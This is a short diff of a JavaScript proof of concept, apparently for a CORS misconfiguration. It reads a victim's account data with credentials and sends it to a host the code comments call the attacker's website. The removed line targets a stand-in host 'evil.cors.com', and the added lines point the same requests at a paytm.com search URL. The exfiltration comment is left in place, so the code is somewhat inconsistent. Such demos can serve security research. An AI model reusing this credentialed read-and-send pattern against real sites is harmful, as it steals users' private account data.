@@ -9,13 +9,13 @@ xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 var a = this.responseText; // Sensitive data from niche.co about user account
 document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
+xhttp.open("GET", "https://search.paytm.com/popularsearch?channel=web&child_site_id=1&site_id=1&version=2&cat_tree=1", true);// Sending that data to Attacker's website
 xhttp.withCredentials = true;
 console.log(a);
 xhttp.send("data="+a);
 }
 };
-xhttp.open("POST", "https://api.segment.io/v1/identify", true);
+xhttp.open("GET", "https://search.paytm.com/popularsearch?channel=web&child_site_id=1&site_id=1&version=2&cat_tree=1", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
